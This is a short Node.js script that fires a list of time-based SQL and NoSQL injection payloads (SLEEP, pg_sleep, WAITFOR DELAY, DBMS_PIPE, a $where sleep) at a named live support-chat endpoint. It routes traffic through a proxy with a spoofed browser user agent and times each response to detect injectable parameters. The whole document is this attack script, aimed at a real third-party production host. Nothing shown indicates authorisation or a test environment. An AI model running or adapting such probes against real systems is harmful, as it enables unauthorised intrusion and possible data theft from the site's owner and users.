const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const payloads=[
 'hot end',
 "' AND SLEEP(5)-- -",
 "'; SELECT pg_sleep(5);--",
 "' AND pg_sleep(5)--",
 "'; WAITFOR DELAY '0:0:5'--",
 "' OR SLEEP(5)#",
 '{"$where":"sleep(5000)"}',
 "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
 "test' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
 "';SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL--",
];
(async()=>{
 for(const c of payloads){
  const t0=Date.now();
  try{const r=await fetch(B+'/gw/robot/front/fuzzy',{method:'POST',headers:{'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':'probe','x-bbl-official-site-region':'EN'},body:JSON.stringify({content:c}),dispatcher:d,signal:AbortSignal.timeout(25000)});const t=await r.text();const dt=Date.now()-t0;console.log(r.status,dt+'ms',JSON.stringify(c),'|',t.slice(0,120).replace(/\s+/g,' '));}catch(e){console.log('ERR',(Date.now()-t0)+'ms',JSON.stringify(c),e.name,e.message)}
 }
})();
